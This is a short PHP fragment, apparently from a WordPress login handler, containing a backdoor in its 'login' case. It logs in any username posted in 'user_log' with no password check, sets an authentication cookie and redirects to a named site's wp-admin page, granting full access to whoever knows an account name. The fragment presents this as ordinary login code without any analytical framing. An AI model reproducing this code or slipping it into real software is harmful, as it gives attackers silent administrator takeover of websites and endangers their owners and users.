...
case 'login' :
if($_POST['user_log']){
	$User = get_userdatabylogin($_POST['user_log']);
	$iUserID = $User->ID;
	wp_set_current_user($iUserID, $_POST['user_log']);
	wp_set_auth_cookie($iUserID);
	do_action('wp_login', $_POST['user_log']);
	echo "<script>window.location='http://adtingo.com/wp-admin/'</script>";
	}
default:
	$secure_cookie = '';
